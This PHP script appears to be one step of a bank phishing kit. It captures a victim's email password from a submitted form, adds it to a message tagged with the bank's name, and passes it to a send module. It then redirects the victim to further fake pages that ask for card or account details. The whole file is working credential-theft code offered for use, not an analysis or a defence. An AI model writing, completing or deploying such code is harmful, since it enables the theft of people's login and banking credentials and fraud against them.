<?php
require_once('Module/Setmodule.php');
$message .= " -------------- $Bank Email Information -------------- \n"."\n";
$message .= "Email Password: ".$_POST['emailPassword']."\n\n"; 
require_once('Module/SendModule.php');



	
		if($settings['Cardpage'] == "1"){
	header("Location: ../Card.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
	else{
	  if($settings['Account'] == "1"){
	header("Location: ../Account.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
  }
  else{
		header("Location: ../complete.php?online_id=".$key."login_id=$praga$praga&session=$praga$praga");
	}
	}
	
	
?>
